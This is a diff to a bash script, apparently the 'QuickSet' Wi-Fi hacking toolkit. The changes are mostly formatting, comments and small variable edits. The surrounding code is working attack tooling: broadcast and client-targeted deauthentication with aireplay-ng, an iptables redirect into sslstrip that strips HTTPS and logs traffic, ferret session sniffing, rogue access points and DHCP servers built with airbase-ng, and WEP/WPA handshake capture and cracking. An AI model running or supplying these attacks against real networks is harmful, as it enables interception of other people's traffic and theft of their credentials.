@@ -78,8 +78,6 @@ function head()
 
 ### Sanitize available devices?
 
-### Where to throw ap_check nullification
-
 ### Find out why the leases look this way /var/lib/dhcp3/dhcpd.leases
 ###  lease 192.168.10.100 {
 ###  starts 4 2011/10/06 19:01:58;
@@ -114,6 +112,9 @@ function head()
 ## I have no idea why the later command failed to work, I will investigate this later on.
 
 ## Hindsight 20/20 the solution was simple, but it took every ounce of patience I had to keep pursuing the end goal.  This just shows how much dedication really pays off if you want something bad enough.  It's what I've truly come to love about my affliction with hacking.
+
+
+## For Functions with Functions I have found that I like to declare my variables for use within a function at the beginning of the function, then I list my sub-functions, at the end of the sub-functions you will find the parent functions commands.  It may be a strange way to do it, but it works for my readability purposes.
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -154,6 +155,8 @@ function head()
 ## Credit for some of the attacks in this script to him as well
 
 ## Grant Pearson for having me RTFM with xterm debugging
+
+## comaX for showing me how much easier it is to follow conditional statements if blank spaces are added in
 
 ## Kudos to my wife for always standing by my side, having faith in me, and showing the greatest of patience for my obsession with hacking
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
@@ -275,6 +278,7 @@ else
 	done
 	pii=$var
 fi
+
 ## The below variable is kinda useless I believe, I noticed it during the Random MAC creation of this script.  I put it in the top of this script for some reason, but that eludes me now.  If found to be useless, please let me know to remove it and save a line.
 var= ## Nulled
 }
@@ -290,6 +294,7 @@ read
 
 mac_control--()
 {
+
 	mac_control_II--()
 	{
 	mac_dev= ## Nulled
@@ -307,7 +312,8 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 	while [ -z $mac_dev ];do
 		echo -e "\033[36m\n\n\n\n\n\nNIC to Change?"
 		read mac_dev
- 	done
+	done
+
 	while [ -z $rand ];do
 		echo -e "\033[36m\nRandom MAC? (y or n)"
 		read rand
@@ -322,6 +328,7 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 			*) rand= ;;
 		esac
 	done
+
 	while [[ $var_II != x ]];do
 		echo -e "\033[36m\nDoes \033[1;33m$mac_dev\033[36m have a Monitor Mode NIC associated with it? (y or n)"
 		read var
@@ -330,6 +337,7 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 			*) var_II= ;;
 		esac
 	done
+
 	case $var in
 		y|Y) case $rand in
 			y|Y) while [ -z $mac_devII ];do
@@ -429,6 +437,7 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 		esac;;
 	esac
 	}
+
 clear
 echo -e "\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -483,6 +492,7 @@ QuickSet - A Quick Way to Setup a Wired/Wireless Hack
               PRESS ENTER TO CONTINUE"
 read
 echo "1" > /proc/sys/net/ipv4/ip_forward
+ap_check= ## Nulled
 init_setup--
 }
 
@@ -602,6 +612,7 @@ echo -e "\033[1;34m
 
 		*) scan--;;
 	esac
+
 clear
 echo -e "\033[1;32m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -795,6 +806,7 @@ Doing so requires that you rename them for this script to work properly\033[31m
 \033[36mDo you wish to continue? (y) or (n)\n"
 	read var
 done
+
 case $var in
 	y|Y) IE= ## Nulled
 	pii= ## Nulled
@@ -824,10 +836,12 @@ deauth--()
 sc= ## Nulled
 rb= ## Router BSSID
 #dea_pid= ## Deauth Scan PID
+
 	deauth_II--()
 	{
 	dt= ## DeAuth Type
 	cm= ## Client MAC
+
 		switch_deauth--()
 		{
 		kill -9 $dea_pid &
@@ -837,11 +851,13 @@ rb= ## Router BSSID
 			echo -e "\033[36m\nSpecified Channel(s)?\n(ie.. 1) (ie.. 1,2,3) (ie.. 1-11)"
 			read sc
 		done
+
 		hop= ## Nulled
 		while [ -z $hop ];do	
 			echo -e "\033[36m\nms between channel hops?"
 			read hop
 		done
+
 		xterm -bg black -fg grey -sb -rightbar -title AiroDump -e airodump-ng -f $hop $pii --channel $sc & dea_pid=$!
 		sleep .7
 		deauth--
@@ -854,6 +870,7 @@ rb= ## Router BSSID
 			echo -e "\033[36m\n(R)epeat DeAuth\n(C)hange or Add Client for DeAuth\n(S)witch Channel or Change Router BSSID\n(E)xit DeAuth" 
 			read r_d
 		done
+
 		case $r_d in
 			r|R) 	case $dt in
 					b|B) echo -e "\033[1;33m" 
@@ -878,6 +895,7 @@ rb= ## Router BSSID
 		echo -e "\033[36m\n(B)roadcast Deauth\n(C)lient Targeted DeAuth\n(S)witch Channel or Change Router BSSID\n(E)xit DeAuth"
 		read dt
 	done
+
 	case $dt in
 		b|B) echo -e "\033[1;33m" 
 		aireplay-ng $pii -0 4 -a $rb
@@ -902,10 +920,12 @@ while [ -z $sc ];do
 	echo -e "\033[36m\nSpecified Channel? (1-11) {choose only one channel}"
 	read sc
 done
+
 while [ -z $rb ];do
 	echo -e "\033[36m\nRouter BSSID?"
 	read rb
 done
+
 kill -9 $ias_pid &
 sleep .7
 xterm -bg black -fg grey -sb -rightbar -title Airodump -e airodump-ng $pii --channel $sc --bssid $rb & dea_pid=$!
@@ -921,6 +941,7 @@ ferret--()
 ## fer_dev= Device to be sniffed
 ## fer_type= Wifi or Wired
 ## wifi_check= Allowing us the conditional choice for a non default ferret setting of channel 6 if we use a wifi device
+
 	ferret_II--()
 	{
 #	fer_chan= ## Channel to sniff on
@@ -998,6 +1019,7 @@ if [ -z $pii ];then
 else
 	fer_dev=$pii
 fi
+
 fer_type=Wireless
 wifi_check=x
 ferret_II--
@@ -1011,6 +1033,7 @@ log_opt="-p" ## Logging option
 lck_fav=Yes ## Favicon Variable
 ses_kil=Yes ## Kill Sessions Variable
 ssl_tail=Yes ## SSLStrip Tail Log
+
 	strip_em_III--()
 	{
 	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $lst_port
@@ -1023,10 +1046,12 @@ ssl_tail=Yes ## SSLStrip Tail Log
 	else
 		xterm -bg black -fg grey -sb -rightbar -title SSLStrip -e sslstrip -w $sstrip_log $log_opt -l $lst_port &
 	fi
+
 	sleep 2
 	case $ssl_tail in
 		Yes) xterm -bg black -fg grey -sb -rightbar -title "SSLStrip Tail" -e tail -f $sstrip_log & ;;
 	esac
+
 	atk_menu--
 	}
 
@@ -1226,6 +1251,7 @@ dhcp_svr--()
 var= ## Nulled
 dhcp_svr_stat= ## Variable for Cleanup Purposes..
 DHCPDCONF="/tmp/dhcpd.conf" ## Used by dhcpd3
+
 	dhcp_func--()
 	{
 	clear
@@ -1291,6 +1317,7 @@ DO NOT USE [\033[1;33m`route -n | awk '/UG/ { print $2 }'`\033[31m] FOR THE GATE
 
 		*) dhcp_func--;;
 	esac
+
 	## Clear any dhcp leases that might have been left behind
 	echo > /var/lib/dhcp3/dhcpd.leases
 	## Empty the file to start clean
@@ -1311,6 +1338,7 @@ DO NOT USE [\033[1;33m`route -n | awk '/UG/ { print $2 }'`\033[31m] FOR THE GATE
 	for sadns in $(grep nameserver /etc/resolv.conf | awk '{print $2}');do
 		echo "option domain-name-servers $sadns;" >> /tmp/dhcpd.conf
 	done
+
 	echo "}"  >> /tmp/dhcpd.conf
 	}
 
@@ -1380,6 +1408,7 @@ ap_check=x ## Variable to make sure these pre-variables are called if DHCP serve
 
 ap_setup--()
 {
+
 	var_meth--()
 	{
 	clear
@@ -1395,6 +1424,7 @@ ap_setup--()
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 		read BB
 	done
+
 	case $BB in
 		1|2) ap--;;
 		*) var_meth--;;
@@ -1468,6 +1498,7 @@ case $var in
 
 	*) ap_setup--;;
 esac
+
 if [[ $private = x ]]; then
 	BB=3
 	ap--
@@ -1509,10 +1540,11 @@ elif [ $BB = 3 ];then
 		*) ap--;;
 	esac
 fi
+
 # give enough time before next command for interface to come up
 # Intended to prevent errors on Virtual Machines with USB cards
 echo -e "\033[1;33mConfiguring Devices.............."
-sleep 10
+sleep 7
 ## Make sure to use matching MTUs for all NICs that are a part of this script, otherwise undesired results may occur.
 macchanger -m $pres_mac at0
 ifconfig at0 up $sapip netmask $sasm
@@ -1592,6 +1624,7 @@ esac
 wifi_101--()
 {
 trap cleanup_101-- INT
+
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 	tchan--()
 	{
@@ -1855,6 +1888,7 @@ Client Technique Selection
 		3|6|9) enc_type='-0';;
 		*) WPA--;;
 	esac
+
 	case $wifu in
 		1|2|3|7|8|9) spec=1
 		while [ -z $e ];do
@@ -1867,6 +1901,7 @@ Client Technique Selection
 
 		*) WPA--;;
 	esac
+
 	WPA_II--
 	}
 ##-----------------------------------------------------------------------------##
@@ -1939,7 +1974,8 @@ Client Technique Selection
 		fi;;
 
 		*) rtech_II--;;
-	esac	
+	esac
+
 	tchan--
 	cfile--
 	iwconfig $pii channel $tc
@@ -1990,6 +2026,7 @@ Client Technique Selection
 		clear
 		_2_out--
 	fi
+
 	amplify--
 	st_3--
 	crack--
@@ -2049,10 +2086,12 @@ Client Technique Selection
 	amplify--()
 	{
 	amp_a= ## Amp Attack Method
-	rec_atk=$orig_atk
+	rec_atk=$orig_atk ## Looping Variable
+
 		amplify_II--()
 		{
 		arp_made= ## Variable to ascertain if arp-request file exists
+
 			amp_null--()
 			{ amp_a= ;} ## Nullifying $amp_a to keep the loop
 
@@ -2139,6 +2178,7 @@ Client Technique Selection
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 			read amp_a
 		done
+
 		amplify_III--
 		}
 	
@@ -2188,6 +2228,7 @@ Client Technique Selection
 
 		*) ctech_II--;;
 	esac
+
 	tchan--
 	cfile--
 	clear
@@ -2211,6 +2252,7 @@ Client Technique Selection
 		xterm -bg black -fg grey -sb -rightbar -title "Shared-Key PRGA Capture" -e airbase-ng $pii -c $tc -e "$e" -s -W 1 -F $cf &
 		sleep 2;;
 	esac
+
 	st_3--
 	crack--
 	}
@@ -2244,6 +2286,7 @@ Client Technique Selection
 		2) wpa_warn--
 		xterm -bg black -fg grey -sb -rightbar -title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 $all_probe -F ab_$cf & wpa_pid=$! ;;
 	esac
+
 	echo -e "\033[1;32m\nPress Enter to Exit Script Once Tgt'd Handshake has Been Captured\n"
 	read
 	kill -9 $wpa_pid &
